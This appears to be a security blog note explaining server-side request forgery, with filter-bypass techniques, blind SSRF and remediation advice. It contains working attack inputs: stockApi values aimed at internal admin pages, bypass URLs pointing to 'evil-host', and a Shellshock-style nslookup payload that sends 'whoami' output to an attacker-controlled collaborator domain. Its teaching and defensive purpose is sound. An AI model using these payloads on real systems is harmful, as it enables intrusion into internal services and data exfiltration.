---
author: Kayra
pubDatetime: 2026-05-02T00:00:00Z
title: Server-Side Request Forgery (SSRF)
slug: server-side-request-forgery
featured: false
draft: false
tags: ["security", "web"]
category: notes
description: An overview of Server-Side Request Forgery (SSRF) vulnerabilities, bypass techniques, and remediation strategies.
---

## Introduction

Server-Side Request Forgery (SSRF) occurs when an attacker is able to cause the server to make requests to unintended locations. This allows the attacker to reach internal systems that are not publicly exposed, such as internal admin panels, metadata services, or other backend services, by using the vulnerable server as a proxy.

## How SSRF Works

Consider an e-commerce application that needs to make an API request to another server to retrieve product stock information. The application exposes an endpoint like:

```text
/product/stock
```

With a parameter that specifies the backend API to query:

```text
stockApi=http://internal-system.com/product/stock/check?productID=123
```

If there is no proper input validation on the `stockApi` parameter, an attacker can modify the target to point elsewhere. For example, an internal admin portal that should only be accessible to administrators:

```text
stockApi=http://192.168.1.170/admin
```

Or using `localhost` to reach an admin panel on the same host that is accessible unauthenticated from the internal network:

```text
stockApi=localhost/admin
```

## Why This Works

SSRF often succeeds because access controls such as a WAF or reverse proxy are placed in front of the server, but requests originating from the server itself are not subject to the same restrictions. The server is treated as a trusted component and its outbound requests bypass the perimeter defenses.

## Bypassing Defenses

Applications may implement blacklist or whitelist-based input filters. When these defenses are in place, several techniques can be used to circumvent them.

### Localhost Representations

For example, blocking `127.0.0.1` or `localhost` is not sufficient. The same destination can be expressed in many forms:

| Representation | Description |
|---------------|-------------|
| `127.0.0.1` | Standard loopback IP |
| `localhost` | Canonical hostname |
| `127.1` | Shorthand for 127.0.0.1 |
| `2130706433` | Decimal representation of 127.0.0.1 |
| `017700000001` | Octal representation |
| `0x7f000001` | Hexadecimal representation |

### Domain Registration

Register a domain name that resolves to `127.0.0.1`. If the application resolves hostnames before applying the filter, the DNS response returns the loopback address, bypassing a blacklist that only checks the parameter value literally.

### URL Encoding and Case Variations

URL-encode components of the target or vary the case of the hostname or protocol:

```text
http://127.0.0.1  →  http://%31%32%37%2e%30%2e%30%2e%31
localhost         →  lOcAlHoSt
```

Double-encoding may also be effective if the application decodes input multiple times.

### Protocol Switching

If the filter only checks for `http://`, try using `https://` instead. Depending on the underlying library, other protocols may also be usable if the server's HTTP client does not restrict the scheme.

### Credential Embedding

When a whitelist checks that the hostname begins with an expected domain, embed the target after the credentials separator:

```text
https://expected-host:fakepassword@evil-host
```

The parser treats `expected-host` as the username and `evil-host` as the actual destination.

### Fragment-Based Bypass

If the whitelist check validates only the end of the URL, the fragment component can be used:

```text
https://evil-host#expected-host
```

The `#` and everything after it is treated as a fragment by the parser, so `evil-host` is the actual destination while `expected-host` passes the suffix check.

## Blind SSRF

In some cases the response from the backend is not visible to the attacker. To confirm the vulnerability, the attacker must force the server to make a detectable outbound connection to a system they control.

Redirect the request to an attacker-controlled domain (e.g., Burp Collaborator) by injecting it as the target:

```text
stockApi=http://your-collaborator-id.oastify.com
```

We can use this to exfiltrate data by injecting a payload that sends command output as a DNS subdomain query to our controlled domain. For example:

```text
() { :; }; /usr/bin/nslookup $(whoami).your-collaborator-id.oastify.com
```

The result of `whoami` will appear as a DNS query on the attacker's domain.

## Remediation

There are two cases to consider.

### Known Destinations

When the application only needs to contact a predefined set of systems, the best approach is to avoid letting the user supply a URL entirely. Instead, define actions in the backend and let the server perform the mapping. The user calls an API endpoint specifying the action, and the backend resolves the correct URL internally.

Instead of accepting an arbitrary target in a parameter like:

```json
{
  "url": "http://anything-user-wants.com"
}
```

Design the API to accept an action identifier:

```json
{
  "endpoint": "createEmployee"
}
```

The backend then maps the action to the appropriate destination:

```javascript
if (endpoint === "createEmployee") {
  url = "https://hr-api.internal.company.com/api/employees";
}
```

If this pattern is not feasible, apply input validation combined with a whitelist. First, validate that the provided data is structurally sound. Then check it against a set of trusted destinations with allowlists at the endpoint level, this is much better than a permissive allow-all-domain approach.

OWASP also recommends routing outbound connections from the application through a firewall to enforce only a few permitted routes at the network layer.

### Unknown Destinations

The second case is when there is no predefined set, for example, a system that lets users configure a callback URL that the system invokes upon a certain condition. Here, whitelisting a specific set of URLs is not practical. In these cases, a blacklist-based approach is the fallback, blocking known dangerous destinations such as internal IP ranges and loopback addresses.